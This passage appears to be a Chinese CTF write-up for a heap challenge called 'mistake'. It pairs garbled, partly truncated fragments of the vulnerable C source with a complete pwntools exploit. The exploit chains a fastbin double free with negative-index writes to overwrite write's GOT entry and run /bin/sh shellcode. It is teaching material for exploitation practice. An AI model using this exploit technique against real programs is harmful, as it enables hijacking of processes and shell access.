        write(1,"3.free\n",7);
        write(1,"4.bye\n",6);
        write(1,"> ",2);
    }
    int transfer(char* buffer){
        int i,result = 0;
        for(i = 0;*(buffer+i) != 0;i++){
            if(*(buffer+i) > '9'||*(buffer+i)  0x2f){
            write(1,"no more chunk.\n",15);
            return;
        }
        chunk_number++;
        chunk* tmp = (chunk*)malloc(0x14);
        write(1,"content: ",9);
        tmp->len = read(0,tmp->buffer,0x10);
        list[chunk_number] = tmp;
        write(1,"create successfully.\n",21);
    }
    void read_chunk()
    {
        int id;
        write(1,"id: ",4);
        if((id = read_int()) == -1){
            return;
        }
        if(id > chunk_number){
            write(1,"Index out of range.\n",20);    
            return;
        }
        write(1,list[id]->buffer,list[id]->len);
    }
    void free_chunk(){
            int id,i;
            write(1,"id: ",4);
        if((id = read_int()) == -1){
            return;
        }
            if(id > chunk_number){
                    write(1,"Index out of range.\n",20);
            return;
            }
        free(list[id]);
        chunk_number--;
        for(i = id;i 
这题感觉对于新手挺有难度的，第一次做的时候花了很长时间，然后现在复习还花了很长时间捡起来
这题的漏洞点在一个很小的地方，在`create_chunk`，这里对输入进行检查，chunk_number的最大值为0x2f，看着是没问题，但是再判断完以后让chunk_number进行自增，也就是到0x30了，list[0x30]是不是溢出了？但是这里溢出看着危害好像不大，但是进过一系列细微的操作，可以造成double
free.
我想了很久要怎么总结pwn题，最后觉得还是一开始先点出漏洞点，然后贴出payload，再对payload进行解释，所以，payload如下：
    #!/usr/bin/env python
    #-*- coding:utf-8 -*-    
    from pwn import *
    # context.log_level = 'debug'
    shellcode1 = "jhH\xb8/bin///sP\xeb\x21"
    shellcode2 = "H\x89\xe71\xf6j;X\x99\x0f\x05"
    p = process('./mistake')
    def double_free():
        p.sendline('3')
        p.sendline('47')
        print p.recv()
        p.sendline('3')
        p.sendline('0')
        print p.recv()
        p.sendline('3')
        p.sendline('46')
        print p.recv()
    def malloc_fd():
        p.sendline('1')
        p.sendline(p64(0x602080-8))
        print p.recv()
        p.sendline('1')
        p.sendline(shellcode2)
        print p.recv()
        p.sendline('1')
        p.sendline(shellcode2)
        print p.recv()
    def free_del():
        for x in xrange(3):
            p.sendline('3')
            p.send(str(0xfffffffd))
            print p.recv()
    def create_chunk():
        for x in xrange(0x31):
            p.sendline('1')
            print p.recv()
            if x == 1:
                p.sendline(p64(0)+p64(0x21))
            else:
                p.sendline(shellcode2)
            print p.recv()
    create_chunk()
    print "===create over=========="
    double_free()
    print "====double free over===="
    free_del()
    print "=====del over=========="
    malloc_fd()
    # 控制chunk_number
    p.sendline('1')
    p.send(p64(0xffffffef))
    print p.recv()
    p.sendline('3')
    p.send('4294967291')
    print p.recv()
    p.sendline('1')
    p.sendline(shellcode1)
    p.interactive()
之前程序里写了编译方式，这题我们是关闭NX的，所以就要想着怎么可以执行shellcode
再讲payload的时候，先提下，我们需要关注几个地方，一个是存放chunk地址的list，还有就是使用libheap的fastbins命令查看fastbin情况
payload的第一步是`create_chunk()`函数，创造出最大值0x31个chunk，chunk的赋值之后就知道其意义
这个时候list的情况：
    list[0]
    list[1]
    list[2]
    ......
    list[46]
    list[47]
    ----overflow----    list[48]
然后就会产生2free了，看`double_free()`，首先是只有free(list[47])操作，我们list[47]的值称为list47，这个时候`fastbin
-> list47`
第二次是free(list[0])，我们把list[0]称为list0，这个时候
    fastbin -> list0
    list0.fd -> list47
但是除了free的操作，还会进行清除list[0]的移位操作：
    list[0] = list[1]
    list[1] = list[2]
    ......
    list[45] = list[46]
    list[46] = list[47]
然后我们再free(list[46])，这个时候list[46]的值为list47，而list47是被free过的，所以就造成了double free
这个时候
    fastbin -> list47
    list47.fd -> list0
    list0.fd -> list47
然后，就涉及到了第二个bug，`int
chunk_number;`，chunk_number的值为int，所以在free_chunk函数中，id>chunk_number的比较可以让id为负数来bypass
看之后的payload，free了3次list[-3] (list[-3] == list[0xfffffffd])
    .bss:0000000000602080 chunk_number    dd
    .bss:0000000000602084                 align 20h
    .bss:00000000006020A0                 public list
    .bss:00000000006020A0 ; void *list
通过ida可以看到list[-3]的地址为0x0602088，值为0(不知道为啥list和chunk_number之间有28byte没被使用的内存)
所以我们实际执行的是3次free(0)，而该操作并不会改变啥，所以实际的效果只有：
    list[-3] = list[0]
    list[-2] = list[1]
    list[-1] = lsit[2]
    ......
    list[44] = list[47]
    list[45] = list[47]
    list[46] = list[47]
但是和刚执行完`create_chunk`后的初始结果相比，是这样的:
    list[-3] = list[1]
    list[-2] = list[2]
    list[-1] = lsit[3]
    ......
    list[43] = list[47]
    list[44] = list[47]
    list[45] = list[47]
    list[46] = list[47]
这个时候执行`malloc_fd`函数，我们回头再看看现在fastbin的情况：
    fastbin -> list47
    list47.fd -> list0
    list0.fd -> list47
所以，第一次malloc，我们得到的是list47的地址，然后在list47.fd的位置写入了`p64(0x602080-8)`
第二次malloc，获取到的是list0的地址
第三次malloc，获取到又是list47的地址，这个时候，fastbin将会指向list47的fd：
    fastbin -> 0x602078
为什么我们让fastbin指向这个地址？因为fastbin在malloc的时候会对size进行检查，也就是检查address+8的值是否为合法size
如果fastbin指向0x602078，则会检查0x602080是否是合法size，这个地址为存储的是chunk_number，我们可以仔细计算下，这个时候的chunk_number=0x2e(0b101110)，是一个合法的地址，所以这个时候我们可以成功malloc，返回地址0x602088，然后更新fastbin，fastbin指向的是0x602078的fd，也就是0x602088，这个地址是list[-3]，
根据上面分析的，这个值也就是初始的list[1]，所以在payload中，我们在这个位置写入的是`p64(0)+p64(0x21)`，为了之后能成功malloc所伪造的头。
这时的fastbin:
    fastbin -> old_list1
然后我们向0x602088写入0x10byte的数据，我们在这个地方写入的是p64(0xffffffef)，也就是-17
之后我们再free(list[-5]) -> free(*0x602078) -> free(0)，
不会发生啥，但是free_chunk除了调用free函数外还有一个操作：
    list[-5] = list[-4]
    list[-4] = list[-3]
    ......
    其中
    list[-4] = 0x602080        
    list[-3] = 0x602088
其中0x602080为chunk_number的地址，所以经过这个操作后，chunk_number的地址被修改为了0x602088地址的值，在上面我们可以看到，值为0xffffffef
最后一步，首先是chunk_number自增，得到0xfffffff0
然后是malloc获得old_list1 + 16地址，写入shellcode
然后在源码中的操作是：
    list[chunk_number] = tmp;
list的地址是0x6020a0
chunk_number的值为0xfffffff0
所以最后是向0x6020a0 + 8*0xfffffff0 = 0x602020地址写入old_list1 + 16(也就是shellcode地址的值)
在我编译出来的程序中
    .got.plt:0000000000602020 off_602020      dq offset write      
0x602020是write的got地址，所以修改了write的got表地址为shellcode地址
所以之后调用write，将会跳到shellcode地址，因为NX没开，所以堆栈可执行，可以成功执行shellcode，导致getshell
PS：payload中的shellcode2没啥用，只是我测试时候用的，这个相当于padding，看payload的时候别纠结这个，之前输入有意义的一个是list[1]构造chunk
header，一个就是最后的shellcode1了，其他的基本算是padding
#### 参考：
  1. [malloc.c](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html)
  2. [Heap Exploitation](https://www.slideshare.net/AngelBoy1/heap-exploitation-51891400?ref=http://4ngelboy.blogspot.com/)
  3. [Understanding glibc malloc](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/)
  4. [Syscalls used by malloc](https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/)
  5. [Double Free浅析](http://static.hx99.net/static/drops/binary-7958.html)
* * *